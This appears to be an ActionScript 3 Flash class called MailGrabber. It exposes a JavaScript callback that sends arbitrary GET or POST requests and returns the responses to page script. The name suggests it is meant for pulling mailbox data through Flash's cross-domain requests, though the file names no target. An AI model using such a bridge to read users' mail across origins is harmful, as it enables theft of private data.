package {

import flash.display.*;
import flash.events.*;
import flash.external.*;
import flash.net.*;
import flash.text.*;
import flash.utils.*;
import flash.system.*;

public class MailGrabber extends MovieClip {

    public function MailGrabber() {
        addEventListener(Event.ADDED_TO_STAGE, onAdded);
    }

    private function onAdded(e:Event):void {
        setTimeout(function():void {
            if (ExternalInterface.available) {
                ExternalInterface.addCallback("send", send);
                ExternalInterface.call("flasherReady");
            }
        }, 1);
    }

    public function send(url:String, data:String, callback:String):void {
        var request:URLRequest = new URLRequest(url);
        if (data) {
            request.data = data;
            request.method = 'POST';
        }
        var loader:URLLoader = new URLLoader();
        var handler:Function = function handler(e:Event):void {
            loader.removeEventListener(Event.COMPLETE, handler);
            loader.removeEventListener(IOErrorEvent.IO_ERROR, handler);
            loader.removeEventListener(SecurityErrorEvent.SECURITY_ERROR, handler);
            if ( e.type != IOErrorEvent.IO_ERROR && e.type != SecurityErrorEvent.SECURITY_ERROR ) {
                ExternalInterface.call(callback, 200, encodeData(loader.data)); // fix status
            } else {
                ExternalInterface.call(callback, 0, encodeData(loader.data)); // error TODO
            }
        }
        
        loader.addEventListener(Event.COMPLETE, handler);
        loader.addEventListener(IOErrorEvent.IO_ERROR, handler);
        loader.addEventListener(SecurityErrorEvent.SECURITY_ERROR, handler);
        loader.load(request);
    }
    
    private function encodeData(obj:Object):String {
        return encodeURIComponent(JSON.stringify(obj));
    }
}
}
